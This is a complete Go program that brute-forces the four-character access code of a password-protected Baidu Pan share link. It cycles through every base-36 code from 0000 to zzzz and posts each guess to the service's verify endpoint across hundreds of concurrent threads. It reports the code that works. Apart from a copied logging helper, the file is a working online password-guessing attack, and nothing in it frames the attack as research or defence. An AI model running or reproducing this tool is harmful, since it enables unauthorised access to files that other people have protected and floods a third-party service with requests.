package main

import (
	"flag"
	"fmt"
	"io"
	"os"
	"runtime"
	"time"

	"io/ioutil"
	"net/http"
	"net/url"
)

type BaiduYunTester struct {
	URL     string
	StartAt string // TODO
	EndWith string
	testUrl string
	Result  string
	debug   bool
}

func NewBaiduYunTester(urlstr, startat, endwith string) (v *BaiduYunTester) {
	v = &BaiduYunTester{
		URL:     urlstr,
		StartAt: startat,
		EndWith: endwith,
	}
	v.testUrl = "http://pan.baidu.com/share/verify?" + urlstr[32:]
	return
}

func (this *BaiduYunTester) Run(threadCount int) string {
	in := make(chan string, 10)
	out := make(chan string)
	for i := 0; i < threadCount; i++ {
		go this.runWorker(in, out)
	}
	go func() {
		inittime := time.Now().UnixNano()
		lastTime := time.Now().UnixNano()
		s := toInt(this.StartAt)
		i := s
		// ffff = 36^4=1679616
		final := toInt(this.EndWith)
		blockLength := final - toInt(this.StartAt)
		if i > final {
			out <- "-"
			return
		}
		for {
			if this.Result != "" {
				INFO.Logf("work finished! password tested: %d time used: %d (s)",
					i-s,
					(time.Now().UnixNano()-inittime)/1e9,
				)
				break
			}
			in <- toBase36(i)
			i++
			if i%3888 == 0 {
				dur := time.Now().UnixNano() - lastTime
				speed := int(3888 * 1e9 / float32(dur))
				lastTime = time.Now().UnixNano()
				INFO.Logf("testing [%s] %d/%d %.1f%% speed: %d/s passed: %d (s) remaining: %d (s)",
					toBase36(i),
					i-s,
					blockLength,
					float32(i-s)/float32(blockLength)*100,
					speed,
					(time.Now().UnixNano()-inittime)/1e9,
					(blockLength-i+s)/speed,
				)
			}
		}
	}()

	this.Result = <-out
	return this.Result
}

func toBase36(v int) string {
	const key = "0123456789abcdefghijklmnopqrstuvwxyz"
	s := ""
	for i := 0; i < 4; i++ {
		s = string(rune(key[v%36])) + s
		v /= 36
	}
	return s
}

func toInt(s string) int {
	v := 0
	for i := 0; i < 4; i++ {
		v *= 36
		if s[i] < 60 {
			v += int(s[i] - 48)
		} else {
			v += int(s[i] - 87)
		}
	}
	return v
}

func (this *BaiduYunTester) runWorker(in, out chan string) {
	pwd := ""
	for {
		if this.Result != "" {
			break
		}
		pwd = <-in
		if this.runSingle(pwd) {
			out <- pwd
		}
	}
}

func (this *BaiduYunTester) runSingle(pwd string) bool {
	res, err := http.PostForm(this.testUrl, url.Values{"pwd": {pwd}})
	if err != nil {
		return false
	}
	bin, _ := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if string(bin)[5:16] == `{"errno":0,` {
		return true
	}
	DEBUG.Log("try ["+pwd+"] fail", string(bin)[6:16])
	return false
}

func (this *BaiduYunTester) SetDebug(b bool) {
	this.debug = b
}

type DoubleWriter struct {
	out1 io.Writer
	out2 io.Writer
}

func (this *DoubleWriter) Write(p []byte) (n int, err error) {
	this.out1.Write(p)
	return this.out2.Write(p)
}

func main() {
	// no use for go 1.5 later
	runtime.GOMAXPROCS(runtime.NumCPU())

	threadCount := flag.Int("j", 500, "threads of http get")
	targetUrlRaw := flag.String("u", "", "baidu pan url like http://pan.baidu.com/share/init?shareid=4087218561&uk=1699323331")
	at := flag.String("at", "0000", "start at")
	to := flag.String("to", "zzzz", "end with")
	isDebug := flag.Bool("d", false, "is debug?")
	out := flag.String("o", "auto", "the file you want to output [default \"auto\" to \"shareid-uk.log\"]")
	flag.Parse()
	target, err := url.Parse(*targetUrlRaw)
	if *targetUrlRaw == "" || err != nil {
		flag.Usage()
		return
	}
	if *out == "auto" {
		*out = fmt.Sprintf("%s-%s.log", target.Query().Get("shareid"), target.Query().Get("uk"))
	}
	if *out != "" {
		f, err := os.Create(*out)
		if err == nil {
			defer f.Close()
			dw := &DoubleWriter{os.Stdout, f}
			INFO.SetOutput(dw)
		}
	}

	INFO.Log("using ", runtime.NumCPU(), " CPU cores ", *threadCount, " threads")
	INFO.Log("start test url:", *targetUrlRaw)

	o := NewBaiduYunTester(*targetUrlRaw, *at, *to)
	if *isDebug {
		DEBUG.SetEnable(true)
	}
	o.Run(*threadCount)
	if o.Result == "" || o.Result == "-" {
		INFO.Log("no result maybe you should try another -at -to")
	} else {
		INFO.Log("result: ", o.Result)
	}
}

// copy from github.com/pa001024/reflex/util/Logger.go

var (
	DEBUG = NewLogger(os.Stderr, false, "[DEBUG] ")
	INFO  = NewLogger(os.Stdout, true, "[INFO] ")
)

// 日志对象
type Logger struct {
	output io.Writer
	enable bool
	perfix string
}

// 创建新日志对象
func NewLogger(w io.Writer, enable bool, perfix string) *Logger {
	return &Logger{w, enable, perfix}
}

// 输出日志
func (l *Logger) Log(s ...interface{}) {
	if l.enable {
		fmt.Fprintf(l.output, "%s%s %v\n", l.perfix, time.Now().Format("2006-01-02 15:04:05"), fmt.Sprint(s...))
	}
}

func (l *Logger) Logf(format string, s ...interface{}) {
	if l.enable {
		fmt.Fprintf(l.output, "%s%s %v\n", l.perfix, time.Now().Format("2006-01-02 15:04:05"), fmt.Sprintf(format, s...))
	}
}

// 返回启用状态
func (l *Logger) Enable() bool {
	return l.enable
}

// 设置启用状态
func (l *Logger) SetEnable(v bool) {
	l.enable = v
}

// 返回输出
func (l *Logger) Output() io.Writer {
	return l.output
}

// 设置输出
func (l *Logger) SetOutput(v io.Writer) {
	l.output = v
}
